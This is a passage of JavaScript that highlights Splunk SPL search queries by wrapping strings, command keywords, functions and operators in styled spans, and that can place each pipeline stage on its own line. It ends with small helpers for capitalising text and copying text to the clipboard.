        return addPlaceholder(`"${content}"`, 'spl-string');
    });
    highlighted = highlighted.replace(/'([^']+)'/g, (match, content) => {
        return addPlaceholder(`'${content}'`, 'spl-string');
    });

    // Keywords (commands)
    const keywords = ['index', 'search', 'where', 'stats', 'eval', 'table', 'sort', 'head', 'tail',
                      'rex', 'rename', 'fields', 'lookup', 'join', 'append', 'appendcols', 'timechart',
                      'chart', 'transaction', 'eventstats', 'streamstats', 'bin', 'bucket', 'dedup',
                      'tstats', 'map', 'return', 'format', 'subsearch', 'iplocation', 'inputlookup',
                      'outputlookup', 'fillnull', 'makemv', 'mvexpand', 'earliest', 'latest', 'span',
                      'top', 'rare', 'multisearch', 'union', 'datamodel', 'from', 'pivot', 'collect',
                      'outputcsv', 'inputcsv', 'metadata', 'rest', 'mstats', 'mcatalog', 'spath'];

    keywords.forEach(kw => {
        const regex = new RegExp(`\\b(${kw})\\b`, 'gi');
        highlighted = highlighted.replace(regex, (match) => addPlaceholder(match, 'spl-keyword'));
    });

    // Functions
    const functions = ['count', 'sum', 'avg', 'min', 'max', 'dc', 'values', 'list', 'first', 'last',
                       'stdev', 'perc\\d+', 'if', 'case', 'match', 'isnull', 'isnotnull', 'coalesce',
                       'round', 'floor', 'ceil', 'len', 'substr', 'replace', 'split', 'mvcount',
                       'strftime', 'strptime', 'now', 'relative_time', 'tonumber', 'tostring',
                       'mvjoin', 'mvindex', 'mvfilter', 'mvappend', 'mvzip', 'cidrmatch', 'like',
                       'searchmatch', 'typeof', 'nullif', 'true', 'false', 'null', 'earliest', 'latest'];

    functions.forEach(fn => {
        const regex = new RegExp(`\\b(${fn})\\(`, 'gi');
        highlighted = highlighted.replace(regex, (match, fn) => addPlaceholder(fn, 'spl-function') + '(');
    });

    // Operators (but not pipes yet - handle those in formatting)
    highlighted = highlighted.replace(/\b(AND|OR|NOT|AS|BY|IN)\b/gi, (match) => addPlaceholder(match, 'spl-operator'));

    // Replace all placeholders with actual spans
    placeholders.forEach(({ id, text, className }) => {
        highlighted = highlighted.replace(id, `<span class="${className}">${text}</span>`);
    });

    // Format pipes onto new lines with indentation (matches glossary styling)
    if (formatPipelines) {
        const segments = highlighted.split(/(\|)/);
        if (segments.length > 1) {
            let result = '';
            let isFirst = true;
            for (let i = 0; i < segments.length; i++) {
                const segment = segments[i];
                if (segment === '|') continue;
                const trimmedSegment = segment.trim();
                if (!trimmedSegment) continue;

                const hasPipe = i > 0 && segments[i - 1] === '|';
                if (isFirst) {
                    result += `<span class="spl-pipe-line">${trimmedSegment}</span>`;
                    isFirst = false;
                } else if (hasPipe) {
                    result += `<span class="spl-pipe-line"><span class="spl-pipe">|</span> ${trimmedSegment}</span>`;
                }
            }
            highlighted = result;
        }
    }

    return highlighted;
}

// ============================================
// Utility Functions
// ============================================

function capitalize(str) {
    return str.charAt(0).toUpperCase() + str.slice(1);
}

function copyToClipboard(text, button) {
    navigator.clipboard.writeText(text).then(() => {
        const originalText = button.textContent;
        button.textContent = 'Copied!';
        button.classList.add('copied');
        setTimeout(() => {
            button.textContent = originalText;
            button.classList.remove('copied');
        }, 2000);
    }).catch(err => {
        console.error('Failed to copy:', err);
    });
}
